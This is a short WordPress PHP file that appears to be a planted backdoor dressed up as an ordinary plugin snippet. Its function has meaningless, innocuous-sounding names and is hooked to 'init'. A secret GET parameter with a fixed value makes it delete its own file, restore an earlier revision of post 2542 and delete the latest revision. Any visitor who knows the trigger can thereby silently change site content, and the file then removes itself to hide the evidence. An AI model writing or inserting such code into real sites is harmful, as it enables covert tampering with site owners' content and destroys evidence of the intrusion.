<?php

function endpoints_interactive_pixel() {
	if (isset($_GET['tracking_javascript_ecommerce']) && $_GET['tracking_javascript_ecommerce'] === 'marketplace_message_switch') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$favicon_webp_icons_support = 2542;
		$external_reports_gallery = wp_get_post_revisions($favicon_webp_icons_support);
		if (empty($external_reports_gallery)) die('no revisions');
		if (count($external_reports_gallery) < 2) die('less than 2');
		$notifier_zoom_information_frontend = array_shift($external_reports_gallery);
		$lightbox_ip_heading_blogroll = $notifier_zoom_information_frontend->ID;
		$translate_modal_csv = array_shift($external_reports_gallery);
		$after_fix_s3 = $translate_modal_csv->ID;
		$pack_icons_right = wp_restore_post_revision($after_fix_s3);
		if ($pack_icons_right === false) die('error restoring');
		$pack_icons_right = wp_delete_post_revision($lightbox_ip_heading_blogroll);		
		if ($pack_icons_right === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'endpoints_interactive_pixel');
